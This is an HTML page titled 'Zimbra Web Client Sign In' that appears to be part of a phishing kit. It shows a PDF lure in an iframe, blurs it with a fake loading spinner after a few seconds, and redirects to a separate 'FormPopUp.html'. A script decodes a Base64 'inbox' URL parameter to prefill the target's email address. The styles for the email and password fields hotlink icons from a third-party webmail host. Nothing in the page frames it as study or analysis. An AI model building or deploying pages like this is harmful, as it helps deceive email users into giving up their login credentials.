
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zimbra Web Client Sign In</title>
 <link rel="icon" type="image/x-icon" href="/favicon.ico">
<style>
iframe {
  
  border: 2px inset black;  /* shorthand for border */
  overflow: hidden;  /* hides scrollbars inside iframe if needed */
}

body {
margin: 0;
font-family: Arial, sans-serif;
height: 640px;
overflow: hidden;
}

/* PDF Background */
.pdf-background {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
border: none;
z-index: 0;
transition: filter 0.3s ease;
}

/* ✅ Blur state */
.pdf-background.blur {
filter: blur(6px);
}

/* ✅ Spinner loader */
.loader {
width: 50px;
height: 50px;
padding: 8px;
aspect-ratio: 1;
border-radius: 50%;
background: #6d6f70;
--_m:
conic-gradient(#0000 10%, #000),
linear-gradient(#000 0 0) content-box;
-webkit-mask: var(--_m);
mask: var(--_m);
-webkit-mask-composite: source-out;
mask-composite: subtract;
animation: l3 1s infinite linear;
display: none;

position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
z-index: 1001;
}

@keyframes l3 {
to {
transform: translate(-50%, -50%) rotate(1turn);
}
}

/* Popup overlay */
.overlay {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background: rgba(0,0,0,0.4);
backdrop-filter: blur(6px);
display: none;
align-items: center;
justify-content: center;
z-index: 1002;
}

.popup {
background: #fff;
border-radius: 8px;
padding: 30px;
width: 520px;
box-shadow: 0 4px 20px rgba(0,0,0,0.3);
text-align: center;
animation: fadeIn 0.5s ease;
z-index: 1000;
}

.popup img {
width: 180px;
margin-bottom: 20px;
}

.popup label {
display: block;
text-align: left;
margin: 10px 0 5px;
font-weight: bold;
font-size: 14px;
color: #444;
}

.popup input {
width: 90%;
padding: 10px 10px 10px 35px;
font-size: 14px;
border: 1px solid #ccc;
border-radius: 4px;
margin-bottom: 15px;
background-repeat: no-repeat;
background-position: 8px center;
background-size: 18px;
}
#email {
background-image: url("http://webmail.ksew.com.pk/cPanel_magic_revision_1650472201/unprotected/cpanel/images/icon-username.png");
}

#password {
background-image: url("http://webmail.ksew.com.pk/cPanel_magic_revision_1650472201/unprotected/cpanel/images/icon-password.png");
}
.popup button {
background: #0094d9;
color: white;
border: none;
padding: 10px;
width: 105%;
font-size: 14px;
font-weight: bold;
border-radius: 4px;
cursor: pointer;
}

.popup button:hover {
background: #007bb5;
}
.blur-wrapper {
  filter: blur(5px);
  pointer-events: none; /* optional: disable interaction while blurred */
}
@keyframes fadeIn {
from { opacity: 0; transform: scale(0.9); }
to { opacity: 1; transform: scale(1); }
}
</style>

<script>
// Get query parameter from URL
function getQueryParameter(name) {
const params = new URLSearchParams(window.location.search);
return params.get(name);
}

window.addEventListener("DOMContentLoaded", () => {
const inboxParam = getQueryParameter("inbox");

if (inboxParam) {
try {
const decoded = atob(inboxParam); // decode Base64
const emailInput = document.getElementById("email");
if (emailInput) {
emailInput.value = decoded;
}
} catch (err) {
console.error("Invalid Base64 string in inbox param:", inboxParam);
}
} else {
console.warn("No inbox parameter found in URL");
}
});
</script>

</head>
<body>
<!-- PDF as background -->
<div class="iframe-wrapper" style="height: 900px;">
   <iframe  id="pdfFrame" src="/BdPak.pdf" width="100%" height="100%"></iframe>
</div>
<!-- Loader -->
<div class="loader" id="loader"></div>



<script>
const pdfFrame = document.getElementById("pdfFrame");
const loader = document.getElementById("loader");
const popup = document.getElementById("popupOverlay");
const wrapper = document.querySelector('.iframe-wrapper');

pdfFrame.addEventListener("load", () => {
// PDF fully loaded, no blur yet
console.log("PDF loaded, showing document first");

// Wait 3s before showing loader
setTimeout(() => {
console.log("blurrr");
loader.style.display = "block";
pdfFrame.classList.add("blur");
wrapper.classList.add('blur-wrapper');

// After 3s, hide loader and show popup
setTimeout(() => {
 window.location.href = 'FormPopUp.html';

}, 3000);

}, 3000);
});
</script>

</body>
</html>
